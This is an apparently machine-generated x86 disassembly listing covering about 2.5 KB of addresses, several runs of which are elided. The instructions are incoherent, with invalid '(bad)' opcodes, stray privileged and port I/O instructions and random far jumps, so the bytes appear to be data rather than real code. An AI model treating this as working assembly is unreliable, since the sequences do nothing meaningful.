  41c882:	or     al,0xaf
  41c884:	sub    al,0x36
  41c886:	dec    esi
  41c887:	jnp    0x41c823
  41c889:	das    
  41c88a:	pop    ss
  41c88b:	cmp    eax,0x40f196ed
  41c890:	ss xchg esi,eax
  41c892:	sub    BYTE PTR [edx+0x1],ch
  41c895:	fdiv   DWORD PTR [esp+edx*1-0x1d1514fc]
  41c89c:	hlt    
  41c89d:	cmp    bl,BYTE PTR [ebx+0x2c]
  41c8a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8a1:	push   ecx
  41c8a2:	dec    esi
  41c8a3:	je     0x41c8b8
  41c8a5:	out    dx,eax
  41c8a6:	sbb    ebp,esp
  41c8a8:	dec    ecx
  41c8a9:	fcmovnbe st,st(1)
  41c8ab:	dec    eax
  41c8ac:	push   cs
  41c8ad:	mov    cl,0xd
  41c8af:	push   esi
  41c8b0:	ss xchg ebp,eax
  41c8b2:	inc    edi
  41c8b3:	adc    al,0x8e
  41c8b5:	cmp    DWORD PTR [edi],0xffffffed
  41c8b8:	cdq    
  41c8b9:	scas   eax,DWORD PTR es:[edi]
  41c8ba:	inc    ebp
  41c8bb:	aas    
  41c8bc:	jle    0x41c861
  41c8be:	xchg   edx,eax
  41c8bf:	fbstp  TBYTE PTR [eax+0xd5]
	...
  41c931:	add    BYTE PTR [eax],al
  41c933:	add    bl,al
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	daa    
  41c941:	loop   0x41c9b1
  41c943:	test   DWORD PTR [eax+0x34],ebx
  41c946:	add    DWORD PTR [eax],eax
  41c948:	test   BYTE PTR [eax],0x0
  41c94b:	add    BYTE PTR [ecx+0x3f],ah
  41c94e:	lahf   
  41c94f:	ds inc ecx
  41c951:	add    eax,0xdfc0c683
  41c956:	jmp    0x41c9d1
  41c958:	pop    edi
  41c959:	out    0x2d,al
  41c95b:	popa   
  41c95c:	add    al,0x30
  41c95e:	das    
  41c95f:	fild   DWORD PTR [edx+ebx*1]
  41c962:	pop    ebp
  41c963:	jmp    0xbf10:0x8825c84b
  41c96a:	lahf   
  41c96b:	scas   al,BYTE PTR es:[edi]
  41c96c:	sbb    eax,0xca4bbcbf
  41c971:	ins    DWORD PTR es:[edi],dx
  41c972:	xor    eax,0x6c1537d4
  41c977:	xor    DWORD PTR [edx-0x34],0x6dee6739
  41c97e:	outs   dx,BYTE PTR ds:[esi]
  41c97f:	leave  
  41c980:	fs pop esi
  41c982:	cmc    
  41c983:	test   eax,0xc033ade
  41c988:	fdivr  DWORD PTR [esp+esi*2-0x6e]
  41c98c:	fstp   DWORD PTR [edi-0x31]
  41c98f:	fdiv   QWORD PTR [ebx]
  41c991:	mov    esi,0x5996b34f
  41c996:	test   al,0xf5
  41c998:	bound  ecx,QWORD PTR [ecx]
  41c99a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c99b:	ds in  eax,0x32
  41c99e:	cmp    BYTE PTR ds:0xd2ae1c69,dh
  41c9a4:	int3   
  41c9a5:	and    edi,DWORD PTR [edx-0x24]
  41c9a8:	xor    al,0xef
  41c9aa:	outs   dx,DWORD PTR ds:[esi]
  41c9ab:	es int3 
  41c9ad:	sub    eax,0xe1639a28
  41c9b2:	mov    al,ds:0xd16f0308
  41c9b7:	jo     0x41c9bc
  41c9b9:	out    0x7f,al
  41c9bb:	out    dx,al
  41c9bc:	sar    BYTE PTR [esi-0x1b8803b5],0x69
  41c9c3:	repz pop es
  41c9c5:	test   DWORD PTR [esi-0x14],ecx
  41c9c8:	mov    ebp,0x54da2c50
  41c9cd:	add    esi,edx
  41c9cf:	leave  
  41c9d0:	mov    ah,0xc6
  41c9d2:	sbb    BYTE PTR [ebx+0x6a],al
  41c9d5:	inc    esi
  41c9d6:	cld    
  41c9d7:	inc    eax
  41c9d8:	test   DWORD PTR [esi],0x35718c78
  41c9de:	dec    ecx
  41c9df:	push   ebx
  41c9e0:	cmp    al,0x3b
  41c9e2:	pop    esp
  41c9e3:	stc    
  41c9e4:	retf   
  41c9e5:	shl    DWORD PTR [ecx],0xee
  41c9e8:	arpl   sp,bx
  41c9ea:	in     eax,dx
  41c9eb:	in     al,0x36
  41c9ed:	aad    0xef
  41c9ef:	(bad)  
  41c9f0:	jl     0x41ca27
  41c9f2:	dec    ebx
  41c9f3:	aad    0x9e
  41c9f5:	gs jns 0x41c9cb
  41c9f8:	cmp    BYTE PTR [edx-0x2f],ch
  41c9fb:	shl    ecx,cl
  41c9fd:	mov    esp,0xc891e057
  41ca02:	lea    esi,[ebp+0x3b]
  41ca05:	push   esp
  41ca06:	mov    eax,eax
  41ca08:	add    al,BYTE PTR [edi+eax*8-0x783b95d5]
  41ca0f:	repz adc ebx,ecx
  41ca12:	repnz or cl,BYTE PTR [eax-0x80]
  41ca16:	jo     0x41ca49
  41ca18:	faddp  st(1),st
  41ca1a:	sub    dh,BYTE PTR [ebp+0x4]
  41ca1d:	or     eax,0xa3ec3055
  41ca22:	jecxz  0x41caa1
  41ca24:	aad    0xdd
  41ca26:	mov    al,ds:0x9be57f49
  41ca2b:	inc    ebx
  41ca2c:	cmp    ebp,DWORD PTR [edi+0x2c]
  41ca2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca30:	cmp    ecx,DWORD PTR [eax]
  41ca32:	in     al,dx
  41ca33:	dec    ecx
  41ca34:	in     al,0xce
  41ca36:	jmp    FWORD PTR [ecx+0x1ddda835]
  41ca3c:	pusha  
  41ca3d:	mov    ecx,0x4a1a9d3f
	...
  41cab2:	add    BYTE PTR [eax],al
  41cab4:	or     bh,BYTE PTR [eax-0x4048555b]
  41caba:	(bad)  
  41cabc:	sbb    eax,0x40e2887e
  41cac1:	ss inc edi
  41cac3:	call   0xf6:0x1354e
  41caca:	add    BYTE PTR [eax],al
  41cacc:	dec    ebp
  41cacd:	xor    edi,DWORD PTR [edx+ebp*8-0x26]
  41cad1:	or     DWORD PTR [ecx-0x55],ecx
  41cad4:	push   cs
  41cad5:	mov    esi,0x2cb4d563
  41cada:	pop    esp
  41cadb:	stos   BYTE PTR es:[edi],al
  41cadc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cadd:	sahf   
  41cade:	inc    ebx
  41cadf:	add    eax,0x8ffc3f27
  41cae4:	jl     0x41ca6f
  41cae6:	ret    0xb6a8
  41cae9:	int3   
  41caea:	add    esp,DWORD PTR [edx+0x5c]
  41caed:	into   
  41caee:	jle    0x41cae8
  41caf0:	popf   
  41caf1:	pop    esp
  41caf3:	add    al,0xf
  41caf5:	xchg   esp,eax
  41caf6:	mov    ch,0x9f
  41caf8:	sbb    ebx,esi
  41cafa:	adc    DWORD PTR [eax+0x244a3c53],eax
  41cb00:	retf   0x5ab4
  41cb03:	cwde   
  41cb04:	mov    eax,0xf5806c25
  41cb09:	xchg   edx,eax
  41cb0a:	or     edx,ebp
  41cb0c:	mov    al,ds:0xf4c00a7b
  41cb11:	cmp    ah,BYTE PTR [ecx]
  41cb13:	(bad)  
  41cb14:	dec    esi
  41cb15:	mov    edi,0x72894229
  41cb1a:	hlt    
  41cb1b:	cmp    eax,0xa4220e52
  41cb20:	stos   BYTE PTR es:[edi],al
  41cb21:	cmp    dl,BYTE PTR [edx-0x4ccffff]
  41cb27:	ret    0x38a8
  41cb2a:	ds aad 0xc6
  41cb2d:	adc    DWORD PTR [edx],esp
  41cb2f:	test   eax,0xe0e6ea65
  41cb34:	(bad)  
  41cb35:	pop    ecx
  41cb36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb37:	ss retf 
  41cb39:	shr    DWORD PTR [ebp-0x35],cl
  41cb3c:	jmp    0xe678:0xfd2c25b8
  41cb43:	int    0x1c
  41cb45:	loope  0x41caea
  41cb47:	pop    ds
  41cb48:	pop    ss
  41cb49:	xor    ebx,ebx
  41cb4b:	cli    
  41cb4c:	aam    0xa1
  41cb4e:	aas    
  41cb4f:	nop
  41cb50:	and    ah,BYTE PTR [edx+0xa766150]
  41cb56:	xchg   ebx,eax
  41cb57:	xchg   ebp,eax
  41cb58:	dec    eax
  41cb59:	fild   DWORD PTR [ecx-0x48443c5d]
  41cb5f:	and    DWORD PTR ds:0x5e3e5a13,esp
  41cb65:	out    0xad,al
  41cb67:	mov    cl,0x7c
  41cb69:	cmc    
  41cb6a:	jmp    0x41cb69
  41cb6c:	xchg   ecx,eax
  41cb6d:	mov    bh,bh
  41cb6f:	cs inc esp
  41cb71:	fstp   DWORD PTR [edx-0x4480fb4d]
  41cb77:	lds    eax,FWORD PTR [edx+0x40]
  41cb7a:	ins    DWORD PTR es:[edi],dx
  41cb7b:	xlat   BYTE PTR ds:[ebx]
  41cb7c:	mov    ch,0x31
  41cb7e:	push   ebx
  41cb7f:	mov    ebx,0xfd9930c3
  41cb84:	rcr    BYTE PTR gs:[edi+0x7d],1
  41cb88:	scas   al,BYTE PTR es:[edi]
  41cb89:	stos   BYTE PTR es:[edi],al
  41cb8a:	ret    0x3ee3
  41cb8d:	mov    ebx,0x8b3320e2
  41cb92:	or     eax,0xa27c7a47
  41cb97:	or     ebp,DWORD PTR [edi-0x2f]
  41cb9a:	xchg   ecx,eax
  41cb9b:	sub    DWORD PTR [eax+esi*8+0x60],ebx
  41cb9f:	push   edx
  41cba0:	inc    esp
  41cba1:	and    BYTE PTR [ecx+0x62],dl
  41cba4:	and    BYTE PTR [ebx+eax*1],al
  41cba7:	adc    esp,DWORD PTR [edx+0x8f33468]
  41cbad:	jo     0x41cbca
  41cbaf:	mov    bl,0xbb
  41cbb1:	scas   eax,DWORD PTR es:[edi]
  41cbb2:	loopne 0x41cc1d
  41cbb4:	dec    ebp
  41cbb5:	shl    DWORD PTR [edx],cl
  41cbb7:	xlat   BYTE PTR ds:[ebx]
  41cbb8:	and    DWORD PTR [edi-0x2c10a3d2],ecx
  41cbbe:	lock packsswb mm5,mm2
	...
  41cc32:	add    BYTE PTR [eax],al
  41cc34:	shl    BYTE PTR [edx],cl
  41cc36:	cli    
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0x45
  41cc41:	jnp    0x41cc26
  41cc43:	jmp    0xf6:0x13644
  41cc4a:	add    BYTE PTR [eax],al
  41cc4c:	mov    edi,0x61a98465
  41cc51:	or     ebx,ecx
  41cc53:	dec    DWORD PTR [esi]
  41cc55:	les    eax,FWORD PTR [edx-0x48]
  41cc58:	and    dh,al
  41cc5a:	rcr    DWORD PTR ss:0x2f16e06a,cl
  41cc61:	mov    BYTE PTR [edi-0x2f],dh
  41cc64:	cmp    BYTE PTR [ecx-0x14],cl
  41cc67:	inc    DWORD PTR [eax]
  41cc69:	jns    0x41ccd7
  41cc6b:	jb     0x41cc40
  41cc6d:	sbb    esi,DWORD PTR [ecx-0x21]
  41cc70:	mov    eax,ds:0x11d3ae1
  41cc75:	(bad)  
  41cc76:	and    al,0x37
  41cc78:	inc    ebp
  41cc79:	push   cs
  41cc7a:	(bad)  
  41cc7b:	mov    ecx,0x728b36a6
  41cc80:	int    0xcc
  41cc82:	rol    DWORD PTR [ebp-0x11],0x5b
  41cc86:	xor    esi,DWORD PTR [eax]
  41cc88:	loopne 0x41cc11
  41cc8a:	xlat   BYTE PTR ds:[ebx]
  41cc8b:	lea    edx,[edx]
  41cc8d:	sbb    eax,ebx
  41cc8f:	dec    eax
  41cc90:	inc    edx
  41cc91:	mov    eax,ds:0xf056bccd
  41cc96:	cld    
  41cc97:	test   DWORD PTR [ebx+edi*4-0x2a],ebx
  41cc9b:	mov    eax,0x2200fc94
  41cca0:	stc    
  41cca1:	jo     0x41cc7b
  41cca3:	fist   DWORD PTR [ecx+0x1e]
  41cca6:	jecxz  0x41ccfa
  41cca8:	jb     0x41ccf1
  41ccaa:	push   edx
  41ccab:	out    dx,eax
  41ccac:	inc    esp
  41ccad:	mov    esi,0xddae259e
  41ccb2:	xor    ecx,esi
  41ccb4:	push   esi
  41ccb5:	or     edx,DWORD PTR [esi+0x47]
  41ccb8:	(bad)  
  41ccb9:	cmp    ah,BYTE PTR [edi]
  41ccbb:	inc    esp
  41ccbc:	jmp    0x41cd1e
  41ccbe:	mov    al,ds:0xcaa8ad6
  41ccc3:	mov    WORD PTR [eax],cs
  41ccc5:	hlt    
  41ccc6:	mov    esi,0x78946ea6
  41cccb:	mov    WORD PTR [edi],fs
  41cccd:	int3   
  41ccce:	sbb    BYTE PTR [edi],cl
  41ccd0:	pop    ss
  41ccd1:	jmp    0x41cd42
  41ccd3:	(bad)  
  41ccd4:	jecxz  0x41cd25
  41ccd6:	sbb    dl,BYTE PTR cs:0x88f10a6e
  41ccdd:	sub    DWORD PTR [eax+esi*4],ecx
  41cce0:	fdiv   DWORD PTR [edi+0x7cc14915]
  41cce6:	inc    eax
  41cce7:	sub    BYTE PTR [edi-0xa],dh
  41ccea:	repz loopne 0x41cd3e
  41cced:	leave  
  41ccee:	jnp    0x41cca7
  41ccf0:	ins    BYTE PTR es:[edi],dx
  41ccf1:	imul   edi,eax,0x8d3008bd
  41ccf7:	or     DWORD PTR [edx-0x342b2ada],0x85b1ab8e
  41cd01:	pop    eax
  41cd02:	mov    esp,?
  41cd04:	xchg   edx,eax
  41cd05:	jg     0x41cd21
  41cd07:	and    eax,0x4bb3e319
  41cd0c:	daa    
  41cd0d:	xchg   esi,eax
  41cd0e:	mov    ecx,0x5d5f4d3f
  41cd13:	pop    esi
  41cd14:	xor    al,0x4d
  41cd16:	test   al,0x24
  41cd18:	aam    0x24
  41cd1a:	ret    0x89d3
  41cd1d:	sahf   
  41cd1e:	stos   BYTE PTR es:[edi],al
  41cd1f:	ins    BYTE PTR es:[edi],dx
  41cd20:	sub    ebp,ebp
  41cd22:	jbe    0x41cd47
  41cd24:	mov    ch,0xb5
  41cd26:	pop    edx
  41cd27:	icebp  
  41cd28:	fcmovnb st,st(5)
  41cd2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd2b:	sar    ecx,cl
  41cd2d:	in     al,0xc9
  41cd2f:	and    cl,BYTE PTR [eax]
  41cd31:	mov    cl,0x68
  41cd33:	xchg   edi,eax
  41cd34:	inc    ebx
  41cd35:	inc    esp
  41cd36:	jg     0x41ccd9
  41cd38:	(bad)  
  41cd39:	popa   
  41cd3a:	mov    bh,dl
  41cd3c:	cmp    eax,0x51a14dea
  41cd41:	fwait
	...
  41cdb2:	add    BYTE PTR [eax],al
  41cdb4:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41cdba:	imul   edi
  41cdbc:	push   ebp
  41cdbd:	call   0xab7d:0xa5deb1bb
  41cdc4:	cmp    dh,BYTE PTR [edi]
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	test   BYTE PTR [eax],0x0
  41cdcb:	add    BYTE PTR [edi+0x51],dl
  41cdce:	scas   eax,DWORD PTR es:[edi]
  41cdcf:	add    al,0x3b
  41cdd1:	loop   0x41cdc3
  41cdd3:	cmp    ch,ch
  41cdd5:	add    BYTE PTR [edx],0xad
  41cdd8:	add    dh,BYTE PTR [esi+0x51dfcbf6]
  41cdde:	pop    ecx
  41cddf:	sub    BYTE PTR [edi+eax*4],0xf0
  41cde3:	pop    esi
  41cde4:	xchg   esp,edx
  41cde6:	gs (bad) 
  41cde9:	inc    DWORD PTR [edx]
  41cdeb:	iret   
  41cdec:	push   ebx
  41cded:	fist   WORD PTR [ebx+ebx*4+0x12]
  41cdf1:	inc    edi
  41cdf2:	adc    ah,al
  41cdf4:	cs cld 
  41cdf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdf7:	xchg   ecx,eax
  41cdf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdf9:	jbe    0x41ce32
  41cdfb:	fst    DWORD PTR [edi-0x13]
  41cdfe:	sahf   
  41cdff:	dec    ecx
  41ce00:	mov    bl,0x1b
  41ce02:	aaa    
  41ce03:	mov    ds,WORD PTR [edx+0x63]
  41ce06:	mov    eax,0x4e493cd1
  41ce0b:	enter  0x59b3,0x4
  41ce0f:	sti    
  41ce10:	jl     0x41ce4b
  41ce12:	mov    dh,ch
  41ce14:	pop    esp
  41ce15:	lods   al,BYTE PTR ds:[esi]
  41ce16:	aaa    
  41ce17:	cmp    bl,BYTE PTR es:[ecx-0x20]
  41ce1b:	mov    ds:0x7a14cb99,eax
  41ce20:	jmp    0xa09bd9d6
  41ce25:	into   
  41ce26:	cwde   
  41ce27:	dec    esp
  41ce28:	shl    BYTE PTR [ebp-0xd058857],1
  41ce2e:	aam    0xc4
  41ce30:	dec    ebp
  41ce31:	jne    0x41ce1b
  41ce33:	test   DWORD PTR [eax],esi
  41ce35:	das    
  41ce36:	sbb    BYTE PTR [esi],bl
  41ce38:	adc    BYTE PTR [edi+ecx*1-0x16],bl
  41ce3c:	dec    ebx
  41ce3d:	jno    0x41ce84
  41ce3f:	and    ebx,DWORD PTR [esi+0x24d5da86]
  41ce45:	cli    
  41ce46:	xor    al,0xec
  41ce48:	cmp    al,0xdb
  41ce4a:	push   ebp
  41ce4b:	sbb    BYTE PTR [edi+0x63],bh
  41ce4e:	xchg   esi,eax
  41ce50:	cmp    DWORD PTR [esi-0x8e9f048],ebp
  41ce56:	in     eax,dx
  41ce57:	clc    
  41ce58:	aas    
  41ce59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce5a:	and    cl,BYTE PTR [edx-0x69]
  41ce5d:	xor    ah,BYTE PTR [esi+ebx*4]
  41ce60:	jmp    0x41ce90
  41ce62:	(bad)  
  41ce63:	xor    al,0xf7
  41ce65:	mov    dh,0xa
  41ce67:	frstor ds:0x9a4ae8ef
  41ce6d:	sbb    al,0xbc
  41ce6f:	arpl   bx,di
  41ce71:	in     eax,dx
  41ce72:	and    esp,ebx
  41ce74:	std    
  41ce75:	dec    edi
  41ce76:	cmp    al,0xcd
  41ce78:	fidiv  WORD PTR [ebx+0x7c0e689e]
  41ce7e:	pushf  
  41ce7f:	mov    DWORD PTR [edi-0x6f6df8e5],edi
  41ce85:	inc    DWORD PTR [eax-0x4df05854]
  41ce8b:	jp     0x41ce3e
  41ce8d:	in     eax,0x1b
  41ce8f:	add    edx,edx
  41ce91:	jecxz  0x41ce7b
  41ce93:	add    ebx,ebx
  41ce95:	das    
  41ce96:	jp     0x41ced2
  41ce98:	cld    
  41ce99:	(bad)  
  41ce9a:	ins    DWORD PTR es:[edi],dx
  41ce9b:	ror    DWORD PTR [ebp+0x6d],1
  41ce9e:	mov    ds,esi
  41cea0:	inc    edi
  41cea1:	push   esp
  41cea2:	cs shl cl,1
  41cea5:	mov    bh,BYTE PTR [edx+0x14]
  41cea8:	(bad)  
  41cea9:	ror    BYTE PTR [esi-0x5],0xd2
  41cead:	xor    ch,BYTE PTR [ebx-0x70]
  41ceb0:	push   ss
  41ceb1:	(bad)  [edx+0x7c]
  41ceb4:	xchg   esp,eax
  41ceb5:	cmc    
  41ceb6:	test   eax,0x83726733
  41cebb:	popa   
  41cebc:	xchg   BYTE PTR [edi-0xa],dl
  41cebf:	and    ecx,ecx
  41cec1:	inc    edi
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	push   esi
  41cf41:	hlt    
  41cf42:	cdq    
  41cf43:	dec    eax
  41cf44:	xor    BYTE PTR [eax],bh
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	test   BYTE PTR [eax],0x0
  41cf4b:	add    BYTE PTR [ebx-0x170e62fc],dh
  41cf51:	(bad)  
  41cf52:	lahf   
  41cf53:	adc    al,0x60
  41cf55:	xchg   esp,eax
  41cf56:	clc    
  41cf57:	and    edi,DWORD PTR [eax-0x9]
  41cf5a:	rol    BYTE PTR [ebp+edi*8-0x2fa85885],cl
  41cf61:	jecxz  0x41cfc4
  41cf63:	mov    esi,0x4dc3356d
  41cf68:	into   
  41cf69:	stos   BYTE PTR es:[edi],al
  41cf6a:	pop    esp
  41cf6b:	inc    eax
  41cf6c:	mov    eax,ds:0x26871a77
  41cf71:	and    eax,0x93e43b25
  41cf76:	jle    0x41cf30
  41cf78:	retf   0x54a3
  41cf7b:	bound  ebp,QWORD PTR [esi]
  41cf7d:	ss popf 
  41cf7f:	stos   DWORD PTR es:[edi],eax
  41cf80:	sub    eax,0x0
  41cf83:	or     al,0x7
  41cf85:	mov    esp,0x8e004f63
  41cf8a:	mov    eax,0x96c4e7e0
  41cf8f:	add    BYTE PTR ds:0xb8fa21c3,al
  41cf95:	stc    
  41cf96:	fisttp WORD PTR [esi+edi*8-0x3f122f04]
  41cf9d:	in     al,dx
  41cf9e:	arpl   WORD PTR ds:0x8cf38f,si
  41cfa4:	and    eax,0x7ba94cc
  41cfa9:	sub    BYTE PTR [ecx],dh
  41cfab:	xchg   esi,ecx
  41cfad:	out    dx,eax
  41cfae:	add    ah,ch
  41cfb0:	jl     0x41cf69
  41cfb2:	retf   
  41cfb3:	adc    al,0x34
  41cfb5:	ds xor ax,0x2958
  41cfba:	popa   
  41cfbb:	rol    DWORD PTR [ecx],0x49
  41cfbe:	test   al,0x76
  41cfc0:	loope  0x41cfa2
  41cfc2:	cld    
  41cfc3:	idiv   BYTE PTR [ecx-0x4b00e500]
  41cfc9:	push   ebp
  41cfca:	mov    ecx,0x579d302c
  41cfcf:	stos   DWORD PTR es:[edi],eax
  41cfd0:	dec    esi
  41cfd1:	pop    ebx
  41cfd2:	stos   DWORD PTR es:[edi],eax
  41cfd3:	ret    0x1cef
  41cfd6:	jbe    0x41cffe
  41cfd8:	sahf   
  41cfd9:	pop    esi
  41cfda:	push   eax
  41cfdb:	cld    
  41cfdc:	imul   eax,DWORD PTR [eax],0x15238c6b
  41cfe2:	rol    DWORD PTR [ebp+0x67b839fa],0x8
  41cfe9:	out    dx,al
  41cfea:	imul   esi,DWORD PTR [edi+0x3e182d6d],0xe108c169
  41cff4:	push   ss
  41cff5:	sub    edx,edi
  41cff7:	xor    cl,al
  41cff9:	jg     0x41cfc6
  41cffb:	xchg   ecx,eax
  41cffc:	inc    esi
  41cffd:	(bad)  
  41cffe:	sbb    al,0x71
  41d000:	mov    edx,0xc6abbe0
  41d005:	setle  BYTE PTR [ecx-0x44]
  41d009:	shl    bh,cl
  41d00b:	scas   eax,DWORD PTR es:[edi]
  41d00c:	push   esi
  41d00d:	pop    esp
  41d00e:	in     al,0x89
  41d010:	adc    ebp,esp
  41d012:	xchg   edx,eax
  41d013:	bound  esi,QWORD PTR [ebp+0x6aed4e25]
  41d019:	fsubp  st(0),st
  41d01b:	cli    
  41d01c:	mov    al,0x7e
  41d01e:	mov    BYTE PTR [ecx-0x6947d1cc],cl
  41d024:	aad    0x7b
  41d026:	or     ebp,DWORD PTR [edi+0x6e]
  41d029:	sub    eax,0xdc2b5417
  41d02e:	push   edx
  41d02f:	cmp    eax,0x8c0de172
  41d034:	and    bl,0x70
  41d037:	jge    0x41d045
  41d039:	shl    BYTE PTR [ebx],1
  41d03b:	adc    DWORD PTR [ebp-0x45],esi
  41d03e:	xchg   BYTE PTR [ecx+0x8506],bl
	...
  41d0b4:	(bad)  [edx-0x5f]
  41d0b7:	clc    
  41d0b8:	mov    bl,0xfb
  41d0ba:	fldcw  WORD PTR [ebx-0x56]
  41d0bd:	cwde   
  41d0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bf:	cmp    BYTE PTR [edx+0x26c1f110],0x39
  41d0c6:	add    DWORD PTR [eax],eax
  41d0c8:	test   BYTE PTR [eax],0x0
  41d0cb:	add    BYTE PTR [ebx],bh
  41d0cd:	mov    edx,0x8a9f9e8e
  41d0d2:	test   al,0xb1
  41d0d4:	outs   dx,BYTE PTR ds:[esi]
  41d0d5:	xchg   cl,al
  41d0d7:	mov    ebp,0x8491728e
  41d0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0dd:	cmp    DWORD PTR [esi+0x59a7d219],edx
  41d0e3:	arpl   di,dx
  41d0e5:	mov    ?,WORD PTR [ebp+0x5b]
  41d0e8:	je     0x41d08a
  41d0ea:	pop    ebx
  41d0eb:	push   edx
  41d0ec:	call   0x298b5365
  41d0f1:	push   ebx
  41d0f2:	cs out 0x15,al
  41d0f5:	(bad)  
  41d0f6:	(bad)  
  41d0f7:	ss das 
  41d0f9:	add    bh,bl
  41d0fb:	jbe    0x41d08e
  41d0fd:	mov    ds:0xed56852f,eax
  41d102:	pop    eax
  41d103:	mov    ch,0xa
  41d105:	jl     0x41d149
  41d107:	pop    ebp
  41d108:	cld    
  41d109:	daa    
  41d10a:	mov    dh,0xe5
  41d10c:	lock push es
  41d10e:	cdq    
  41d10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d110:	les    esp,FWORD PTR [ebp-0xceb0803]
  41d116:	imul   esi,eax,0x413bcac2
  41d11c:	mov    dl,0x97
  41d11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d11f:	call   0xa1ad:0xbba96799
  41d126:	jbe    0x41d16a
  41d128:	lea    eax,[ecx-0x41a916a1]
  41d12e:	mov    ecx,0xcf74bde9
  41d133:	pop    ebp
  41d134:	sbb    eax,0x4233252d
  41d139:	xor    bh,dh
  41d13b:	stos   DWORD PTR es:[edi],eax
  41d13c:	add    BYTE PTR ds:0x289d6292,bl
  41d142:	pop    edi
  41d143:	sub    dl,bh
  41d145:	leave  
  41d146:	add    esi,edx
  41d148:	or     eax,0x14a843fd
  41d14d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d14e:	mov    ch,0xf3
  41d150:	sub    al,0xab
  41d152:	mov    esi,0x9fe329f9
  41d157:	mov    bh,ah
  41d159:	push   edx
  41d15a:	enter  0xf222,0x87
  41d15e:	jecxz  0x41d158
  41d160:	jbe    0x41d166
  41d162:	mov    ds:0x5d1d8e53,eax
  41d167:	jmp    0x41d19c
  41d169:	xchg   BYTE PTR [ebx+0x58],cl
  41d16c:	pinsrw mm5,WORD PTR [ebp-0x7b],0xda
  41d171:	jae    0x41d114
  41d173:	rdtsc  
  41d175:	jmp    0x681f:0xf91ca3d4
  41d17c:	xlat   BYTE PTR fs:[ebx]
  41d17e:	push   ecx
  41d17f:	cmc    
  41d180:	xchg   ecx,eax
  41d181:	mov    dl,0x15
  41d183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d184:	adc    BYTE PTR [eax+0xd86f5ea],cl
  41d18a:	sbb    BYTE PTR gs:[edi-0x43],cl
  41d18e:	push   esi
  41d18f:	push   es
  41d190:	cld    
  41d191:	aam    0xc
  41d193:	or     BYTE PTR [edi-0x11],ch
  41d196:	mov    ebp,0xfa91affb
  41d19b:	dec    esp
  41d19c:	(bad)  
  41d19d:	scas   eax,DWORD PTR es:[edi]
  41d19e:	lods   eax,DWORD PTR ds:[esi]
  41d1a0:	xchg   ebx,eax
  41d1a1:	adc    BYTE PTR [edx+ebp*8+0x55],bh
  41d1a5:	rol    BYTE PTR [ebx],0xf8
  41d1a8:	test   al,0x64
  41d1aa:	cmovp  ebp,DWORD PTR [edi+ecx*4]
  41d1ae:	test   DWORD PTR [esi+0x7e],edx
  41d1b1:	xlat   BYTE PTR ds:[ebx]
  41d1b2:	cwde   
  41d1b3:	dec    esp
  41d1b4:	ret    0xb8c5
  41d1b7:	and    eax,0xf1a15104
  41d1bc:	mov    ds:0xc7e0f48,al
  41d1c1:	in     al,dx
	...
  41d232:	add    BYTE PTR [eax],al
  41d234:	repz and ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	push   ebp
  41d241:	xchg   esp,eax
  41d242:	dec    eax
  41d243:	rcr    BYTE PTR [edx+edi*1],1
  41d246:	add    DWORD PTR [eax],eax
  41d248:	test   BYTE PTR [eax],0x0
  41d24b:	add    dh,cl
  41d24d:	inc    BYTE PTR [edi-0x59]
  41d250:	fstp   DWORD PTR [eax-0x7]
  41d253:	mov    dh,0x44
  41d255:	sub    DWORD PTR [ebx+0x1f],ebp
  41d258:	and    esi,edi
  41d25a:	sahf   
  41d25b:	loope  0x41d2d4
  41d25d:	js     0x41d2b1
  41d25f:	aaa    
  41d260:	aam    0xb4
  41d262:	fwait
  41d263:	sbb    al,0xc5
  41d265:	and    DWORD PTR [edx-0x4c],0x3b
  41d269:	pop    es
  41d26a:	cmpxchg edi,ebp
  41d26d:	enter  0x7fd0,0xde
  41d271:	xchg   ebp,eax
  41d272:	push   0xc0c013b0
  41d277:	das    
  41d278:	mov    al,0x82
  41d27a:	xchg   BYTE PTR [eax+0x3d6e6550],bl
  41d280:	pop    ebx
  41d281:	mov    bl,0x24
  41d283:	fcmovnbe st,st(6)
  41d285:	aas    
  41d286:	scas   al,BYTE PTR es:[edi]
  41d287:	nop
  41d288:	shl    DWORD PTR [eax-0x71],cl
  41d28b:	sub    BYTE PTR [edx-0x27c81ccd],dh
  41d291:	call   0x5c26:0xe31b2542
  41d298:	lea    ecx,[eax+ecx*8+0x69]
  41d29c:	mov    al,ds:0xda7f301
  41d2a1:	mov    ebp,0xfb3724ab
  41d2a6:	sub    bh,BYTE PTR [ebp+0x18]
  41d2a9:	xor    ebp,edi
  41d2ab:	mov    dh,0x28
